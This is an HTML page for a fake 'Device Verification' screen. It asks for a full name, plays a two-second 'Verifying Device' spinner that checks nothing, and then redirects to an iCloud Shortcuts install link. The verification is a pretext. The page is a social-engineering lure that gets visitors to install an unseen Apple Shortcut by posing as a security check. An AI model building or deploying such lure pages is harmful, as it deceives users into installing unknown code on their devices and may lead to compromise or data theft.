<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Verification</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Inter', sans-serif;
      background: #f5e6d3;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background: white;
      border-radius: 32px;
      padding: 48px 36px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.08);
    }

    .shield-circle {
      width: 100px;
      height: 100px;
      background: #f5e6d3;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 28px;
      font-size: 48px;
    }

    h1 {
      font-size: 24px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 8px;
      letter-spacing: -0.5px;
    }

    .subtitle {
      font-size: 14px;
      color: #999;
      margin-bottom: 36px;
      line-height: 1.5;
    }

    .input-group {
      margin-bottom: 20px;
      text-align: left;
      position: relative;
    }

    .input-label {
      font-size: 11px;
      font-weight: 600;
      color: #E8853D;
      position: absolute;
      top: -8px;
      left: 16px;
      background: white;
      padding: 0 4px;
      letter-spacing: 0.5px;
      text-transform: uppercase;
    }

    .input-field {
      width: 100%;
      padding: 18px 20px;
      border: 1.5px solid #e8e8e8;
      border-radius: 16px;
      font-size: 15px;
      font-family: 'Inter', sans-serif;
      color: #1a1a1a;
      outline: none;
      transition: border-color 0.2s;
    }

    .input-field:focus {
      border-color: #E8853D;
    }

    .input-field::placeholder {
      color: #bbb;
    }

    .verify-btn {
      width: 100%;
      padding: 18px;
      background: linear-gradient(135deg, #E8853D, #d4722a);
      color: white;
      border: none;
      border-radius: 16px;
      font-size: 16px;
      font-weight: 600;
      font-family: 'Inter', sans-serif;
      cursor: pointer;
      transition: all 0.3s ease;
      letter-spacing: 0.3px;
      margin-top: 8px;
    }

    .verify-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 24px rgba(232,133,61,0.4);
    }

    .verify-btn:active {
      transform: translateY(0);
    }

    /* Loading Screen */
    .loading-screen {
      display: none;
    }

    .spinner {
      width: 60px;
      height: 60px;
      border: 4px solid #f5e6d3;
      border-top: 4px solid #E8853D;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 24px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-title {
      font-size: 20px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 8px;
    }

    .loading-subtitle {
      font-size: 14px;
      color: #999;
    }
  </style>
</head>
<body>

  <div class="container">

    <!-- SCREEN 1: Name Input -->
    <div id="mainScreen">
      <div class="shield-circle">🛡️</div>
      <h1>Device Verification</h1>
      <p class="subtitle">Enter your name to verify your device</p>

      <div class="input-group">
        <span class="input-label">Full Name</span>
        <input
          type="text"
          class="input-field"
          id="nameInput"
          placeholder="Enter your full name"
        />
      </div>

      <button class="verify-btn" onclick="verify()">
        Verify Device
      </button>
    </div>

    <!-- SCREEN 2: Loading -->
    <div id="loadingScreen" class="loading-screen">
      <div class="spinner"></div>
      <p class="loading-title">Verifying Device</p>
      <p class="loading-subtitle">Please wait...</p>
    </div>

  </div>

  <script>
    var SHORTCUT_URL = "https://www.icloud.com/shortcuts/75c9d43d30014467974990851fd45464";

    function verify() {
      var name = document.getElementById("nameInput").value.trim();

      if (name === "") {
        document.getElementById("nameInput").style.borderColor = "#E8853D";
        document.getElementById("nameInput").focus();
        return;
      }

      document.getElementById("mainScreen").style.display = "none";
      document.getElementById("loadingScreen").style.display = "block";

      setTimeout(function() {
        window.location.href = SHORTCUT_URL;
      }, 2000);
    }

    document.getElementById("nameInput").addEventListener("keypress", function(e) {
      if (e.key === "Enter") {
        verify();
      }
    });
  </script>

</body>
</html>
